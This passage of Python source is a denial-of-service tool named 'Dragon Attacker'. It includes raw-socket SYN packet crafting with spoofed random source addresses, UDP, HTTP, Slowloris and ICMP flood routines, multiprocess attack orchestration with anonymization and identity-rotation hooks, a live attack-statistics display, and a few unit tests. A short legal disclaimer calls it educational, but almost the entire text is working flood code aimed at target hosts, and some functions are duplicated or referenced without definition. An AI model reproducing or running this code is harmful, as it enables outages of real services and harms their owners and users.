    target_ips = config["target_ips"]
    target_port = config["target_port"]
    packet_size = config["packet_size"]
    num_processes = config["num_processes"]
    limit_system_resources()
    if config["use_anonymization"]:
        setup_anonymization()

    processes = []
    attack_types = ["syn_flood", "udp_flood", "http_flood", "slowloris", "icmp_flood"]
    web_ports = [80, 443, 8080, 8443]
    if target_port in web_ports:
        weights = {"syn_flood": 1, "udp_flood": 1, "http_flood": 3, "slowloris": 2, "icmp_flood": 1}
    else:
        weights = {"syn_flood": 2, "udp_flood": 2, "http_flood": 1, "slowloris": 1, "icmp_flood": 2}

    weighted_attacks = [attack for attack, weight in weights.items() for _ in range(weight)]
    logger.info(f"Starting distributed attack with {num_processes} processes using multiple attack vectors")

    for i in range(min(num_processes, 8)):
        attack_type = random.choice(weighted_attacks)
        target_ip = random.choice(target_ips)
        process = None
        if attack_type == "syn_flood":
            process = multiprocessing.Process(target=syn_flood, args=(target_ip, target_port, False))
        elif attack_type == "udp_flood":
            async def run_udp(): await udp_flood_async(target_ip, target_port, packet_size, False)
            loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)
            process = multiprocessing.Process(target=lambda: loop.run_until_complete(run_udp()))
        elif attack_type == "http_flood":
            async def run_http(): await http_flood_async(target_ip, target_port, packet_size, False)
            loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)
            process = multiprocessing.Process(target=lambda: loop.run_until_complete(run_http()))
        elif attack_type == "slowloris":
            async def run_slowloris(): await slowloris_attack(target_ip, target_port, max_connections=150)
            loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)
            process = multiprocessing.Process(target=lambda: loop.run_until_complete(run_slowloris()))
        elif attack_type == "icmp_flood":
            process = multiprocessing.Process(target=icmp_flood, args=(target_ip,))

        if process:
            processes.append(process)
            process.start()
            logger.info(f"Started {attack_type} attack process on {target_ip}:{target_port}")
            if config["use_anonymization"]:
                rotate_identity()
    try:
        while not stop_event.is_set() and any(p.is_alive() for p in processes):
            time.sleep(1)
    finally:
        for process in processes:
            if process.is_alive():
                process.terminate()

class TestDDoSFunctions(unittest.TestCase):
    def test_generate_random_ip(self):
        ipv4 = IPAddressGenerator.get_random_ip(use_ipv6=False)
        parts = ipv4.split('.')
        self.assertEqual(len(parts), 4)
        for part in parts:
            self.assertTrue(0 <= int(part) <= 255)
        ipv6 = IPAddressGenerator.get_random_ip(use_ipv6=True)
        parts = ipv6.split(':')
        self.assertEqual(len(parts), 8)
        for part in parts:
            self.assertTrue(all(c in '0123456789abcdef' for c in part.lower()))

    @patch('socket.socket')
    def test_syn_flood(self, mock_socket):
        stop_event = multiprocessing.Event()
        stop_event.set()
        syn_flood("127.0.0.1", 80, ipv6=False)
        self.assertTrue(mock_socket.called)

    def test_encrypt_decrypt(self):
        original = b"Test payload for encryption"
        encrypted = encrypt_payload(original)
        signature = sign_payload(encrypted)
        self.assertTrue(len(signature) > 0)
        self.assertTrue(len(encrypted) > len(original))

def run_attack(attack_method, target_info):
    try:
        logger.info(f"Starting attack: {attack_method.__name__} against {target_info}")
        attack_method(target_info)
    except KeyboardInterrupt:
        logger.warning("Attack interrupted by user")
        print(f"\n{Colors.YELLOW}Attack interrupted. Cleaning up...{Colors.RESET}")
        raise
    except (ConnectionRefusedError, socket.timeout) as e:
        logger.error(f"Connection error: {e}")
        print(f"\n{Colors.RED}Connection failed: Target {target_info} is not responding.{Colors.RESET}")
        print(f"{Colors.YELLOW}Possible reasons:\n  - Target is offline or blocking connections\n  - The port is not open or is filtered\n  - A firewall is blocking the connection{Colors.RESET}")
    except socket.gaierror as e:
        logger.error(f"DNS resolution error: {e}")
        print(f"\n{Colors.RED}Cannot resolve hostname: {target_info}{Colors.RESET}")
        print(f"{Colors.YELLOW}Check if the hostname is correct and DNS is working{Colors.RESET}")
    except OSError as e:
        logger.error(f"Network error: {e}")
        print(f"\n{Colors.RED}Network error: {e}{Colors.RESET}")
        if "Too many open files" in str(e):
            print(f"{Colors.YELLOW}System limit for open files reached. Try reducing the number of processes.{Colors.RESET}")
    except Exception as e:
        logger.error(f"Error during attack: {e}")
        print(f"\n{Colors.RED}Error during attack: {e}{Colors.RESET}")
        traceback.print_exc()

def attack(attack_methods, config):
    target_ips = config["target_ips"]
    target_port = config["target_port"]
    if not target_ips:
        logger.error("No target IPs specified")
        print(f"{Colors.RED}Error: No target IPs specified.{Colors.RESET}")
        return

    manager = Manager()
    counters = manager.dict({'packets_sent': 0, 'bytes_sent': 0, 'connections': 0, 'errors': 0})
    stop_event = multiprocessing.Event()
    stats_process = multiprocessing.Process(target=display_stats, args=(counters, stop_event))
    stats_process.daemon = True
    stats_process.start()
    try:
        processes = []
        print(f"\n{Colors.BOLD}{Colors.GREEN}Starting attack with {config['num_processes']} processes...{Colors.RESET}")
        logger.info(f"Starting attack with {config['num_processes']} processes")
        for i in range(config["num_processes"]):
            target_ip = target_ips[i % len(target_ips)]
            target_info = (target_ip, target_port)
            if target_port in [80, 443, 8080, 8443]:
                weights = [3 if 'http' in m.__name__.lower() else 2 if 'slowloris' in m.__name__.lower() else 1 for m in attack_methods]
                attack_method = random.choices(attack_methods, weights=weights, k=1)[0]
            else:
                attack_method = random.choice(attack_methods)
            logger.debug(f"Process {i} using {attack_method.__name__} on {target_info}")
            p = multiprocessing.Process(target=run_attack_with_counters, args=(attack_method, target_info, counters))
            p.daemon = True
            processes.append(p)
            p.start()
        for p in processes:
            p.join()
    except KeyboardInterrupt:
        logger.info("Attack stopped by user")
        print(f"\n{Colors.YELLOW}Attack stopped by user.{Colors.RESET}")
    finally:
        stop_event.set()
        stats_process.join(timeout=1)
        print(f"\n{Colors.BOLD}{Colors.CYAN}Attack Summary:{Colors.RESET}")
        print(f"{Colors.CYAN}Total Packets Sent:{Colors.RESET} {counters['packets_sent']}")
        print(f"{Colors.CYAN}Total Data Sent:{Colors.RESET} {format_bytes(counters['bytes_sent'])}")
        print(f"{Colors.CYAN}Total Connections:{Colors.RESET} {counters['connections']}")
        print(f"{Colors.CYAN}Total Errors:{Colors.RESET} {counters['errors']}")
        logger.info(f"Attack completed - Packets: {counters['packets_sent']}, Data: {format_bytes(counters['bytes_sent'])}, Connections: {counters['connections']}, Errors: {counters['errors']}")

def run_attack_with_counters(attack_method, target_info, counters):
    try:
        retry_count, max_retries, backoff_time = 0, 3, 1
        while retry_count < max_retries:
            try:
                attack_method(target_info, counters)
                break
            except (ConnectionRefusedError, socket.timeout, OSError) as e:
                retry_count += 1
                if retry_count >= max_retries:
                    logger.error(f"Maximum retries reached for {target_info}: {e}")
                    counters['errors'] += 1
                    raise
                wait_time = backoff_time * (2 ** (retry_count - 1))
                logger.warning(f"Connection issue with {target_info}, retrying in {wait_time}s: {e}")
                time.sleep(wait_time)
    except Exception as e:
        logger.error(f"Error in attack process: {e}")
        counters['errors'] += 1

def format_bytes(size):
    for unit in ['B', 'KB', 'MB', 'GB', 'TB']:
        if size < 1024.0:
            return f"{size:.2f} {unit}"
        size /= 1024.0
    return f"{size:.2f} PB"

def display_stats(counters, stop_event):
    start_time = time.time()
    last_packets, last_bytes = 0, 0
    update_interval = 1.0
    print("\033[2J\033[?25l", end="")
    try:
        while not stop_event.is_set():
            elapsed = time.time() - start_time
            packets_sent = counters.get('packets_sent', 0)
            bytes_sent = counters.get('bytes_sent', 0)
            connections = counters.get('connections', 0)
            errors = counters.get('errors', 0)
            packet_rate = (packets_sent - last_packets) / update_interval
            data_rate = (bytes_sent - last_bytes) / update_interval
            last_packets, last_bytes = packets_sent, bytes_sent
            print("\033[H\033[2K", end="")
            print(f"{Colors.BOLD}{Colors.CYAN}==== ATTACK STATISTICS ===={Colors.RESET}")
            print(f"{Colors.CYAN}Runtime:{Colors.RESET} {int(elapsed//60):02d}:{int(elapsed%60):02d}")
            print(f"{Colors.CYAN}Packets Sent:{Colors.RESET} {packets_sent} ({packet_rate:.2f}/sec)")
            print(f"{Colors.CYAN}Data Sent:{Colors.RESET} {format_bytes(bytes_sent)} ({format_bytes(data_rate)}/sec)")
            print(f"{Colors.CYAN}Connections:{Colors.RESET} {connections}")
            print(f"{Colors.CYAN}Errors:{Colors.RESET} {errors}")
            print(f"\n{Colors.YELLOW}Press Ctrl+C to stop the attack{Colors.RESET}")
            time.sleep(update_interval)
    except Exception as e:
        logger.error(f"Error in stats display: {e}")
    finally:
        print("\033[?25h", end="")

def display_legal_disclaimer():
    print(f"\n{Colors.RED}{Colors.BOLD}===== LEGAL DISCLAIMER ====={Colors.RESET}")
    print(f"{Colors.RED}This tool is provided for EDUCATIONAL PURPOSES ONLY.{Colors.RESET}")
    print(f"{Colors.RED}Using this tool against targets without explicit permission is ILLEGAL{Colors.RESET}")
    print(f"{Colors.RED}and may result in criminal charges or civil liability.{Colors.RESET}")
    print(f"{Colors.RED}You are solely responsible for your actions using this tool.{Colors.RESET}")
    print(f"\n{Colors.BOLD}Do you understand and agree to use this tool responsibly? (yes/no):{Colors.RESET} ", end="")
    if input().lower() not in ['yes', 'y']:
        print(f"{Colors.RED}Operation cancelled.{Colors.RESET}")
        exit(0)

def build_syn_packet(source_ip, source_port, dest_ip, dest_port):
    ip_ihl, ip_ver, ip_tos, ip_tot_len, ip_id, ip_frag_off, ip_ttl, ip_proto, ip_check = 5, 4, 0, 0, random.randint(1, 65535), 0, 64, socket.IPPROTO_TCP, 0
    ip_saddr, ip_daddr = socket.inet_aton(source_ip), socket.inet_aton(dest_ip)
    ip_ihl_ver = (ip_ver << 4) + ip_ihl
    ip_header = struct.pack('!BBHHHBBH4s4s', ip_ihl_ver, ip_tos, ip_tot_len, ip_id, ip_frag_off, ip_ttl, ip_proto, ip_check, ip_saddr, ip_daddr)
    tcp_source, tcp_dest, tcp_seq, tcp_ack_seq, tcp_doff = source_port, dest_port, random.randint(1, 4294967295), 0, 5
    tcp_fin, tcp_syn, tcp_rst, tcp_psh, tcp_ack, tcp_urg = 0, 1, 0, 0, 0, 0
    tcp_window, tcp_check, tcp_urg_ptr = socket.htons(5840), 0, 0
    tcp_offset_res = (tcp_doff << 4) + 0
    tcp_flags = tcp_fin + (tcp_syn << 1) + (tcp_rst << 2) + (tcp_psh << 3) + (tcp_ack << 4) + (tcp_urg << 5)
    tcp_header = struct.pack('!HHLLBBHHH', tcp_source, tcp_dest, tcp_seq, tcp_ack_seq, tcp_offset_res, tcp_flags, tcp_window, tcp_check, tcp_urg_ptr)
    psh = struct.pack('!4s4sBBH', socket.inet_aton(source_ip), socket.inet_aton(dest_ip), 0, socket.IPPROTO_TCP, len(tcp_header))
    psh += tcp_header
    tcp_check = calculate_checksum(psh)
    tcp_header = struct.pack('!HHLLBBH', tcp_source, tcp_dest, tcp_seq, tcp_ack_seq, tcp_offset_res, tcp_flags, tcp_window) + struct.pack('H', tcp_check) + struct.pack('!H', tcp_urg_ptr)
    return ip_header + tcp_header

def calculate_checksum(msg):
    s = 0
    if len(msg) % 2 == 1:
        msg += b'\0'
    for i in range(0, len(msg), 2):
        w = msg[i] + (msg[i+1] << 8)
        s += w
    s = (s >> 16) + (s & 0xffff)
    s += (s >> 16)
    return socket.htons(~s & 0xffff)

def tcp_syn_flood(target_info, counters=None):
    target_ip, target_port = target_info
    if not (hasattr(os, 'geteuid') and os.geteuid() == 0):
        logger.error("TCP SYN flood requires root privileges")
        print(f"{Colors.RED}TCP SYN flood attack requires root privileges. Skipping.{Colors.RESET}")
        if counters: counters['errors'] += 1
        return
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
        sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        logger.info(f"Starting TCP SYN flood against {target_ip}:{target_port}")
        sent = 0
        while True:
            try:
                source_ip = IPAddressGenerator.get_random_ip()
                source_port = random.randint(1024, 65535)
                packet = build_syn_packet(source_ip, source_port, target_ip, target_port)
                sock.sendto(packet, (target_ip, 0))
                if counters:
                    counters['packets_sent'] += 1
                    counters['bytes_sent'] += len(packet)
                sent += 1
                if sent % 1000 == 0:
                    logger.debug(f"Sent {sent} SYN packets to {target_ip}:{target_port}")
                time.sleep(0.001)
            except (socket.error, OSError) as e:
                logger.error(f"Error sending SYN packet: {e}")
                if counters: counters['errors'] += 1
                time.sleep(0.1)
    except PermissionError:
        logger.error("TCP SYN flood requires root privileges")
        print(f"{Colors.RED}TCP SYN flood attack requires root privileges. Skipping.{Colors.RESET}")
        if counters: counters['errors'] += 1
    except Exception as e:
        logger.error(f"TCP SYN flood error: {e}")
        if counters: counters['errors'] += 1
    finally:
        sock.close()

def udp_flood(target_info, counters=None):
    target_ip, target_port = target_info
    packet_size = config.get("packet_size", 1024)
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        payload = os.urandom(packet_size)
        logger.info(f"Starting UDP flood against {target_ip}:{target_port}")
        sent = 0
        while True:
            try:
                sock.sendto(payload, (target_ip, target_port))
                if counters:
                    counters['packets_sent'] += 1
                    counters['bytes_sent'] += packet_size
                sent += 1
                if sent % 1000 == 0:
                    logger.debug(f"Sent {sent} UDP packets to {target_ip}:{target_port}")
            except (socket.error, OSError) as e:
                logger.error(f"Error sending UDP packet: {e}")
                if counters: counters['errors'] += 1
                time.sleep(0.1)
    except Exception as e:
        logger.error(f"UDP flood error: {e}")
        if counters: counters['errors'] += 1
    finally:
        sock.close()

def http_flood(target_info, counters=None):
    target_ip, target_port = target_info
    user_agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15"
    ]
    accept_headers = [
        "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
        "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
    ]
    paths = ["/", "/index.html", "/about", "/contact", "/services"]
    methods = ["GET", "POST", "HEAD"]
    is_https = (target_port == 443)
    protocol = "https" if is_https else "http"
    hostname = target_ip
    logger.info(f"Starting HTTP flood against {protocol}://{hostname}:{target_port}")
    sent = 0
    try:
        while True:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(4)
                sock.connect((target_ip, target_port))
                if counters: counters['connections'] += 1
                if is_https:
                    context = ssl.create_default_context()
                    context.check_hostname = False
                    context.verify_mode = ssl.CERT_NONE
                    sock = context.wrap_socket(sock, server_hostname=hostname)
                method, path, user_agent, accept = random.choice(methods), random.choice(paths), random.choice(user_agents), random.choice(accept_headers)
                if method == "POST":
                    post_data = f"param1=value1×tamp={int(time.time())}"
                    request_data = f"{method} {path} HTTP/1.1\r\nHost: {hostname}\r\nUser-Agent: {user_agent}\r\nAccept: {accept}\r\nConnection: keep-alive\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: {len(post_data)}\r\n\r\n{post_data}\r\n"
                else:
                    request_data = f"{method} {path} HTTP/1.1\r\nHost: {hostname}\r\nUser-Agent: {user_agent}\r\nAccept: {accept}\r\nConnection: keep-alive\r\n\r\n"
                sock.sendall(request_data.encode())
                sent += 1
                if counters:
                    counters['packets_sent'] += 1
                    counters['bytes_sent'] += len(request_data)
                if sent % 100 == 0:
                    logger.debug(f"Sent {sent} HTTP requests to {hostname}:{target_port}")
                time.sleep(0.01)
            except Exception as e:
                if counters: counters['errors'] += 1
                logger.debug(f"HTTP request error: {e}")
            finally:
                try: sock.close()
                except: pass
    except KeyboardInterrupt:
        logger.info("HTTP flood attack interrupted")
        raise

def slowloris(target_info, counters=None):
    target_ip, target_port = target_info
    max_sockets = 150
    is_https = (target_port == 443)
    hostname = target_ip
    logger.info(f"Starting Slowloris attack against {target_ip}:{target_port}")
    sockets_list = []
    try:
        for _ in range(max_sockets):
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(4)
                sock.connect((target_ip, target_port))
                if is_https:
                    context = ssl.create_default_context()
                    context.check_hostname = False
                    context.verify_mode = ssl.CERT_NONE
                    sock = context.wrap_socket(sock, server_hostname=hostname)
                sock.send(f"GET / HTTP/1.1\r\nHost: {hostname}\r\n".encode())
                sockets_list.append(sock)
                if counters:
                    counters['connections'] += 1
                    counters['packets_sent'] += 1
                    counters['bytes_sent'] += 20
            except Exception as e:
                logger.debug(f"Error creating Slowloris connection: {e}")
                if counters: counters['errors'] += 1
        while True:
            logger.debug(f"Maintaining {len(sockets_list)} Slowloris connections")
            for i, sock in enumerate(list(sockets_list)):
                try:
                    partial_header = f"X-Random: {random.randint(1, 5000)}\r\n"
                    sock.send(partial_header.encode())
                    if counters:
                        counters['packets_sent'] += 1
                        counters['bytes_sent'] += len(partial_header)
                except socket.error:
                    sockets_list.pop(i)
                    try:
                        new_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        new_sock.settimeout(4)
                        new_sock.connect((target_ip, target_port))
                        if is_https:
                            context = ssl.create_default_context()
                            context.check_hostname = False
                            context.verify_mode = ssl.CERT_NONE
                            new_sock = context.wrap_socket(new_sock, server_hostname=hostname)
                        new_sock.send(f"GET / HTTP/1.1\r\nHost: {hostname}\r\n".encode())
                        sockets_list.append(new_sock)
                        if counters: counters['connections'] += 1
                    except socket.error:
                        if counters: counters['errors'] += 1
            time.sleep(15)
    except KeyboardInterrupt:
        logger.info("Slowloris attack interrupted")
    finally:
        for sock in sockets_list:
            try: sock.close()
            except: pass

def save_config(config):
    try:
        with open("config.json", "w") as config_file:
            json.dump(config, config_file, indent=2)
            logger.info("Configuration saved to config.json")
    except Exception as e:
        logger.error(f"Error saving configuration: {e}")

if __name__ == "__main__":
    if platform.system() == "Windows" and sys.version_info >= (3, 8):
        asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())
        
    print_banner()
    display_legal_disclaimer()

    if hasattr(os, 'geteuid'):
        if os.geteuid() != 0:
            print(f"\n{Colors.YELLOW}WARNING: Not running as root.{Colors.RESET}")
            print(f"{Colors.YELLOW}Some attacks may not work correctly.{Colors.RESET}\n")
    else:
        print(f"\n{Colors.YELLOW}Note: Running on Windows. Some attacks (ICMP/SYN Flood) may require running as Administrator.{Colors.RESET}\n")
    
    if platform.system() != "Windows":
        try:
            soft, hard = resource.getrlimit(resource.RLIMIT_NOFILE)
            if soft < 4096 and hard >= 4096:
                resource.setrlimit(resource.RLIMIT_NOFILE, (4096, hard))
                logger.info(f"Increased open file limit from {soft} to 4096")
        except Exception as e:
            logger.warning(f"Couldn't increase system limits: {e}")

    logger.info("Dragon Attacker started")
    global config
    config = load_or_ask_config()
    save_config(config)

    attack_methods = [udp_flood, http_flood, slowloris]
    if hasattr(os, 'geteuid') and os.geteuid() == 0:
        attack_methods.extend([icmp_flood, tcp_syn_flood])

    try:
        attack(attack_methods, config)
    except KeyboardInterrupt:
        print(f"\n{Colors.YELLOW}Attack interrupted by user. Cleaning up...{Colors.RESET}")
    except Exception as e:
        logger.error(f"Unexpected error during attack: {e}")
        print(f"\n{Colors.RED}Error: {e}{Colors.RESET}")
        traceback.print_exc()
    finally:
        print(f"\n{Colors.GREEN}Dragon Attacker complete. Thank you for using our tool.{Colors.RESET}")
        logger.info("Dragon Attacker finished")
